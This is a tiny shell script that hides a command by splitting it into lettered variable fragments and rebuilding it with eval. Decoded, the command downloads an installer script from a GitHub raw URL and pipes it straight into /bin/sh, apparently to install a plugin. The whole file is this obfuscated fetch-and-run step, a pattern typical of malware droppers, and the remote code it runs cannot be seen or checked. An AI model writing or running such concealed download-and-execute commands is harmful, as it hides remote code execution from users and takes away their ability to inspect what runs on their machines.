z="
";Iz='nt.c';Rz='nsta';Jz='om/e';Fz='hubu';Xz='sh';Ez='.git';Qz='in/i';Sz='ller';Oz='trea';Pz='m/ma';Gz='serc';Wz='bin/';Az='wget';Mz='edie';Cz='ps:/';Vz=' | /';Lz='37/j';Dz='/raw';Bz=' htt';Nz='pgex';Tz='.sh ';Hz='onte';Kz='mil2';Uz='-O -';
eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$Rz$Sz$Tz$Uz$Vz$Wz$Xz"